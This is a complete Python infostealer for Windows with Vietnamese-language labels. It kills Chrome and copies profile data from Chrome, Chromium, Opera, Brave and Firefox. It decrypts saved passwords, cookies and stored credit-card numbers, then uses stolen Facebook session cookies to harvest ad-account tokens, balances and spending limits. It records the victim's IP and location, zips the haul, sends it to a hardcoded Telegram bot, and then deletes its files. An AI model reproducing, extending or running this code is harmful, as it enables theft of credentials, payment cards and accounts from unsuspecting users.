import os,json,shutil,win32crypt,sqlite3,base64,random
import requests 
from datetime import datetime,timedelta
from Crypto.Cipher import DES3
from Crypto.Cipher import AES
from pyasn1.codec.der import decoder
from hashlib import sha1, pbkdf2_hmac
from Crypto.Util.Padding import unpad 
from base64 import b64decode
import hmac,platform


windows_version = platform.platform()
rq = requests.Session()
now = datetime.now()
response =requests.get("https://ipinfo.io").text
ip_country = json.loads(response)
ten_country = ip_country['region']
city = ip_country['city']
ip = ip_country['ip']
country_code = ip_country['country']
newtime = str(now.hour) + "h" +str(now.minute)+"m"+str(now.second)+"s"+"-"+str(now.day)+"-"+str(now.month)+"-"+str(now.year)
name_f = country_code +" "+ ip +newtime
    

def check_chrome_running():
    for proc in os.popen('tasklist').readlines():
        if 'chrome.exe' in proc:
            return True
    return False
if check_chrome_running():
    os.system('taskkill /f /im chrome.exe')
else:print("")
def find_profile(path_userdata):
    profile_path = []
    for name in os.listdir(path_userdata):
        if name.startswith("Profile") or name == 'Default':
            dir_path = os.path.join(path_userdata, name)
            profile_path.append(dir_path)
    return profile_path

def find_profile_firefox(firefox_path):
    profile_path = []
    for name in os.listdir(firefox_path):
            dir_path = os.path.join(firefox_path, name)
            profile_path.append(dir_path)
    return profile_path

def get(data_path,browser_path,name):
    data = os.path.join(data_path, name);os.mkdir(data)
    profiles = find_profile(browser_path)
    for i,profile in enumerate(profiles, 1):
        os.mkdir(os.path.join(data,"Profile"+str(i)))
        def copy_file():
            if os.path.exists(os.path.join(profile,'Login Data')):
                shutil.copyfile(os.path.join(profile,'Login Data'),os.path.join(data,"Profile"+str(i),'Login Data'))
            if os.path.exists(os.path.join(browser_path,'Local State')):
                shutil.copyfile(os.path.join(browser_path,'Local State'),os.path.join(data,"Profile"+str(i),'Local State'))
            if os.path.exists(os.path.join(profile,'Network','Cookies')):
                shutil.copyfile(os.path.join(profile,'Network','Cookies'),os.path.join(data,"Profile"+str(i),'Cookies')) 
        copy_file();delete_file(os.path.join(data,"Profile"+str(i)))  

def get_firefox(data_path,firefox_path,name):
    data_firefox = os.path.join(data_path,name);os.mkdir(data_firefox)
    profiles = find_profile_firefox(firefox_path)
   
    for i,profile in enumerate(profiles, 1):
        os.mkdir(os.path.join(data_firefox,"profile"+str(i)))
        def copy_file():
            if os.path.exists(os.path.join(profile,'cookies.sqlite')):
                shutil.copyfile(os.path.join(profile,'cookies.sqlite'),os.path.join(data_firefox,"profile"+str(i),'cookies.sqlite'))
            if os.path.exists(os.path.join(profile,'key4.db')):
                shutil.copyfile(os.path.join(profile,'key4.db'),os.path.join(data_firefox,"profile"+str(i),'key4.db'))
            if os.path.exists(os.path.join(profile,'logins.json')):
                shutil.copyfile(os.path.join(profile,'logins.json'),os.path.join(data_firefox,"profile"+str(i),'logins.json'))
        copy_file()
        if os.path.exists(os.path.join(data_firefox,"profile"+str(i),'cookies.sqlite')):
            delete_firefox(os.path.join(data_firefox,"profile"+str(i)))
        else:
            shutil.rmtree(os.path.join(data_firefox,"profile"+str(i)))   

def parse_cookie(cookie_str):
    cookies = {}
    for c in cookie_str.split(';'):
        key_value = c.strip().split('=', 1)
        if len(key_value) == 2:
            key, value = key_value
            if key.lower() in ['c_user', 'xs', 'fr']: 
                cookies[key] = value
    
    return cookies

def get_market():
    try:
        act = rq.get('https://adsmanager.facebook.com/adsmanager/manage')
        list_data = act.text
        x = list_data.split("act=")
        idx = x[1].split('&')[0]
        id = 'act_'+idx
        list_token = rq.get(f'https://adsmanager.facebook.com/adsmanager/manage/campaigns?act={idx}&breakdown_regrouping=0').text
        x_token = list_token.split('{window.__accessToken="')
        token = x_token[1].split('";')[0]
        return token
    except:
        return False

def check_tkqc(cookies,headers,token):
    get_tkqc = f"https://graph.facebook.com/v17.0/me/adaccounts?fields=account_id&access_token={token}"
    list_tikqc = requests.get(get_tkqc,cookies=cookies,headers=headers)
    soluong_tkqc=[]
    for itemo in list_tikqc.json()['data']:
        xitem = (itemo["id"])
        soluong_tkqc.append(xitem)
    for item in soluong_tkqc:
        urlo = f"https://graph.facebook.com/v16.0/{item}/?fields=business,spend_cap,amount_spent,adtrust_dsl,balance,adspaymentcycle,currency,account_status,name&access_token={token}"
        x = requests.get(urlo,cookies=cookies,headers=headers)
        data = x.json()
        status = data['account_status']
        if (status) ==1:
            stt = "Active"
        if int(status) ==2:
            stt = "Disabled"
        if int(status) ==3:
            stt = "Need to pay"
        name = data["name"]
        id_tkqc = data["id"]
        tien_te = data["currency"]
        so_du = data["balance"]
        da_chi_tieu = data["amount_spent"]
        limit_ngay = data["adtrust_dsl"]
        
        try:
            nguong_no = data["adspaymentcycle"]["data"][0]["threshold_amount"]
        except:
            nguong_no = "0"
            
        if int(nguong_no) !=0:
            remain_Threshold = int(nguong_no)-int(so_du)
        else:
            remain_Threshold = "0"
            
        if "business" not in data:
            account_type = "Personal normal"
            created_from_BM = ""
        else:
            account_type = "Business"
            created_from_BM = '('+"Name:"+data["business"]["name"] +'-' + "ID:"+data["business"]["id"]+')'
        with open((os.path.join(os.environ["TEMP"], name_f, "Cookiefb.txt")), 'a',encoding='utf-8') as f:
            f.write("# Account:"+str(name)+"-"+str(id_tkqc)+"|  Account_Type :"+str(account_type) +str(created_from_BM)+"|  Status :"+str(stt) +"|  Currency:"+str(tien_te)+"|  Total Spent:"+str(da_chi_tieu)+"|  Balance:"+str(so_du)+"|  Remain Threshold:"+str(remain_Threshold)+"|  Limit: "+str(limit_ngay)+"|  Threshold: "+str(nguong_no)+ "\n\n")

def check_cookie(cookie_input):
    try:
        cookies = parse_cookie(cookie_input)
        headers = {
                'authority': 'adsmanager.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
                'cache-control': 'max-age=0',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
                'sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.140", "Google Chrome";v="112.0.5615.140", "Not:A-Brand";v="99.0.0.0"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"15.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
                'viewport-width': '794',
            }
        rq.headers.update(headers)
        rq.cookies.update(cookies)
        token= get_market()
        with open((os.path.join(os.environ["TEMP"], name_f, "Cookiefb.txt")), 'a',encoding='utf-8') as f:
            f.write(cookie_input+"\n\n")
        check_tkqc(cookies,headers,token)              
    except:
        print("")

def encrypt(data_profile):
    login_db = os.path.join(data_profile, "Login Data")
    key_db = os.path.join(data_profile ,"Local State",)
    cookie_db = os.path.join(data_profile, "Cookies")
    credit_db=os.path.join(data_profile, "Web Data")
    with open(key_db, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    try :
        conn = sqlite3.connect(login_db)
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_password = decrypted_pass[:-16].decode() 
            with open((os.path.join(data_profile, "Password.txt")), 'a',encoding='utf-8') as f:
                f.write("URL: " + url + "\t\t" + username + "|" + decrypted_password + "\n" + "\n")      
    except :
        print(" ")
    try:
        db_cre = sqlite3.connect(credit_db)
        cursor_credit = db_cre.cursor()
        cursor_credit.execute("SELECT * FROM credit_cards")
        rows1 = cursor_credit.fetchall()
        for row1 in rows1:
            encrypted_credit = row1[4]
            iv1 = encrypted_credit[3:15]
            payload1 = encrypted_credit[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv1)
            decrypted_cre = cipher.decrypt(payload1)
            decrypted_credit= decrypted_cre[:-16].decode() 
            with open((os.path.join(os.environ["TEMP"], name_f, "credit.txt")), 'a',encoding='utf-8') as f:
                f.write("Số thẻ : "+str(decrypted_credit) +"\nNgày hết Hạn : "+str(row1[2])+"/"+str(row1[3])+"\nTên : "+str(row1[1])+"\nBiệt hiệu : "+str(row1[10]+"\n\n"))
    except:print("")
    try:    
        conn2 = sqlite3.connect(cookie_db)
        conn2.text_factory = lambda b: b.decode(errors="ignore")
        cursor2 = conn2.cursor()
        cursor2.execute("""
        SELECT host_key, name, value, encrypted_value,is_httponly,is_secure,expires_utc
        FROM cookies
        """)
        json_data = []
        for host_key, name, value,encrypted_value,is_httponly,is_secure,expires_utc in cursor2.fetchall():
            if not value:
                iv = encrypted_value[3:15]
                encrypted_value = encrypted_value[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                decrypted_value = cipher.decrypt(encrypted_value)[:-16].decode()
            else:
                decrypted_value = value     
            json_data.append({
                "host": host_key,
                "name": name,
                "value": decrypted_value,
                "is_httponly":is_httponly,
                "is_secure":is_secure,
                "expires_utc":expires_utc
                })
            
        result = []
        for item in json_data:
            host = item["host"]
            name = item["name"]
            value = item["value"]
            is_httponly= item["is_httponly"]
            is_secure=item["is_secure"]
            expires_utc = item["expires_utc"]
            if is_httponly == 1 : httponly = "TRUE"
            else:httponly = "FALSE"
            if is_secure == 1 : secure = "TRUE"
            else:secure = "FALSE"
            cookie = f"{host}\t{httponly}\t{'/'}\t{secure}\t\t{name}\t{value}\n"          
            with open((os.path.join(data_profile, "Cookie.txt")), 'a') as f:
                f.write(cookie)
            if host == ".facebook.com":
                result.append(f"{name}={value}")
        result_string = "; ".join(result)
        # with open((os.path.join(os.environ["TEMP"], name_f, "Cookiefb.txt")), 'a',encoding='utf-8') as f:
        #     f.write(result_string+"\n\n")
        check_cookie(result_string)
    except:
        print("")
def delete_file(data_profile):
    login_db = os.path.join(data_profile, "Login Data")
    key_db = os.path.join(data_profile ,"Local State",)
    cookie_db = os.path.join(data_profile, "Cookies")
    credit_db=os.path.join(data_profile, "Web Data")
    try:
        encrypt(data_profile)
        if os.path.exists(login_db):
            os.remove(login_db),
        if os.path.exists(key_db):    
            os.remove(key_db),
        if os.path.exists(credit_db):
            os.remove(credit_db),
        if os.path.exists(cookie_db):    
            os.remove(cookie_db)
    except:print("")
def decryptMoz3DES( globalSalt, entrySalt, encryptedData ):
  hp = sha1( globalSalt ).digest()
  pes = entrySalt + b'\x00'*(20-len(entrySalt))
  chp = sha1( hp+entrySalt ).digest()
  k1 = hmac.new(chp, pes+entrySalt, sha1).digest()
  tk = hmac.new(chp, pes, sha1).digest()
  k2 = hmac.new(chp, tk+entrySalt, sha1).digest()
  k = k1+k2
  iv = k[-8:]
  key = k[:24]
  return DES3.new( key, DES3.MODE_CBC, iv).decrypt(encryptedData)

def decodeLoginData(data):
  asn1data = decoder.decode(b64decode(data)) # decodage base64, puis ASN1
  key_id = asn1data[0][0].asOctets()
  iv = asn1data[0][1][1].asOctets()
  ciphertext = asn1data[0][2].asOctets()
  return key_id, iv, ciphertext 
def getLoginData(afkk):
  logins = []
  json_file = os.path.join(afkk ,"logins.json")
  loginf = open( json_file, 'r',encoding='utf-8').read()
  jsonLogins = json.loads(loginf)
  for row in jsonLogins['logins']:
    encUsername = row['encryptedUsername']
    encPassword = row['encryptedPassword']
    logins.append( (decodeLoginData(encUsername), decodeLoginData(encPassword), row['hostname']) )
  return logins

def decryptPBE(decodedItem, globalSalt): 
  pbeAlgo = str(decodedItem[0][0][0])
  if pbeAlgo == '1.2.840.113549.1.12.5.1.3': 
    entrySalt = decodedItem[0][0][1][0].asOctets()
    cipherT = decodedItem[0][1].asOctets()
    key = decryptMoz3DES( globalSalt, entrySalt, cipherT )
    return key[:24]
  elif pbeAlgo == '1.2.840.113549.1.5.13': #pkcs5 pbes2  
    entrySalt = decodedItem[0][0][1][0][1][0].asOctets()
    iterationCount = int(decodedItem[0][0][1][0][1][1])
    keyLength = int(decodedItem[0][0][1][0][1][2])
    k = sha1(globalSalt).digest()
    key = pbkdf2_hmac('sha256', k, entrySalt, iterationCount, dklen=keyLength)    
    iv = b'\x04\x0e'+decodedItem[0][0][1][1][1].asOctets()
    cipherT = decodedItem[0][1].asOctets()
    clearText = AES.new(key, AES.MODE_CBC, iv).decrypt(cipherT)
    return clearText

def getKey(afk):  
    conn = sqlite3.connect(os.path.join(afk, "key4.db"))
    c = conn.cursor()
    c.execute("SELECT item1,item2 FROM metadata;")

    row = c.fetchone()
    globalSalt = row[0] 
    item2 = row[1]
    decodedItem2 = decoder.decode( item2 ) 
    clearText = decryptPBE( decodedItem2, globalSalt )
    if clearText == b'password-check\x02\x02': 
      c.execute("SELECT a11,a102 FROM nssPrivate;")
      for row in c:
        if row[0] != None:
            break
      a11 = row[0]
      a102 = row[1] 
      if a102 != None: 
        decoded_a11 = decoder.decode( a11 )
        clearText= decryptPBE( decoded_a11, globalSalt )
        return clearText[:24]   
    return None
def encrypt_firefox(path_f):
    try:
        if os.path.exists(os.path.join(path_f ,"logins.json")):
            key = getKey(path_f)
            logins = getLoginData(path_f)

            for i in logins:
                username= unpad( DES3.new( key, DES3.MODE_CBC, i[0][1]).decrypt(i[0][2]),8 ) 
                password= unpad( DES3.new( key, DES3.MODE_CBC, i[1][1]).decrypt(i[1][2]),8 ) 
                str_pass =  password.decode('utf-8')
                str_user =  username.decode('utf-8')
                with open((os.path.join(path_f,"Password.txt")), 'a',encoding='utf-8') as f:
                    f.write(i[2]+"          "+str_user + "|"+ str_pass + "\n")
    except :
        print("")
    try:
        db_path = os.path.join(path_f, "cookies.sqlite")
        db = sqlite3.connect(db_path) 
        db.text_factory = lambda b: b.decode(errors="ignore")
        cursor = db.cursor()
        cursor.execute("""
        SELECT id , name, value ,host
        FROM moz_cookies
        """)
        json_data = []
        for id , name, value ,host in cursor.fetchall():
            json_data.append({
                "host": host,
                "name": name,
                "value": value
                
            })
        result = []
        for item in json_data:
            host = item["host"]
            name = item["name"]
            value = item["value"]
            if host == ".facebook.com":
                result.append(f"{name}={value}")
            cookie = f"{host}\t\t{'/'}\t\t\t{name}\t{value}\n"          
            with open((os.path.join(path_f, "Cookie.txt")), 'a') as f:
                f.write(cookie)
        result_string = "; ".join(result)
        with open((os.path.join(os.environ["TEMP"], name_f, "Cookiefb.txt")), 'a',encoding='utf-8') as f:
            f.write(result_string+"\n\n")
    except:
        print("")
    
def delete_firefox(data_firefox_profile):
    key4db = os.path.join(data_firefox_profile,"key4.db")
    cookiesdb=os.path.join(data_firefox_profile,"cookies.sqlite")
    logindb = os.path.join(data_firefox_profile ,"logins.json")
    try:
        encrypt_firefox(data_firefox_profile)
        if os.path.exists(key4db):
            os.remove(key4db),
        if os.path.exists(cookiesdb):    
            os.remove(cookiesdb),
        if os.path.exists(logindb):    
            os.remove(logindb)
    except: print("")
   
def demso() :
    path_demso = r"C:\Users\Public\Document\number.txt"
    if os.path.exists(path_demso):
        with open(path_demso, 'r') as file:
            number = file.read()
        number = int(number)+1
        with open(path_demso, 'w') as file:
            abc = str(number)
            file.write(abc)
    else:
        with open(path_demso, 'w') as file:
            file.write("1")
            number = 1
    return number

def id() :
    path_id = r"C:\Users\Public\Document\id.txt"
    if os.path.exists(path_id):
        with open(path_id, 'r') as file:
            id = file.read()
    else:
        random_number = random.randint(10**14, 10**15 - 1)
        id = str(random_number)
        with open(path_id, 'w') as file:
            file.write(id)
    return id
def send():
    number = "Data lần thứ " + str(demso())
    python310_path = r'C:\Users\Public\Document.zip'
    file_path = r'C:\Users\Public\Document\run.py'
    z_ph = os.path.join(os.environ["TEMP"], name_f +'.zip');shutil.make_archive(z_ph[:-4], 'zip', data_path)
    token = 'https://api.telegram.org/bot6881207827:AAHqzC29EgkakeDLb4xKld-95tyLRaDzFNU/sendDocument';IDchat = '2023824752'
    with open(z_ph, 'rb') as f:
        requests.post(token,data={'caption':"ID:"+"\t" + id() +"\nIP:"+ ip +"\n"+number,'chat_id':IDchat},files={'document': f})
    shutil.rmtree(os.environ["TEMP"], name_f +'.zip');shutil.rmtree(os.environ["TEMP"], name_f)
    if os.path.exists(python310_path):
        os.remove(python310_path)
    if os.path.exists(file_path):
        os.remove(file_path)

data_path = os.path.join(os.environ["TEMP"],name_f);os.mkdir(data_path)
chrome = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")
firefox = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming","Mozilla", "Firefox", "Profiles")
# Edge = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data")
Opera = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable")
Brave = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","BraveSoftware", "Brave-Browser", "User Data")
# coccoc = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","CocCoc", "Browser", "User Data")
chromium = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Chromium", "User Data")
if os.path.exists(chrome):
    get(data_path,chrome,"Chrome")
# if os.path.exists(coccoc):
#     get(data_path,coccoc,"CocCoc")
if os.path.exists(chromium):
    get(data_path,chromium,"Chromium") 
# if os.path.exists(Edge):
#     get(data_path,Edge,"Edge")
if os.path.exists(Opera):
    get(data_path,Opera,"Opera")
if os.path.exists(Brave):
    get(data_path,Brave,"Brave")    
    
if os.path.exists(firefox):
    get_firefox(data_path,firefox,"Firefox")    
 
send()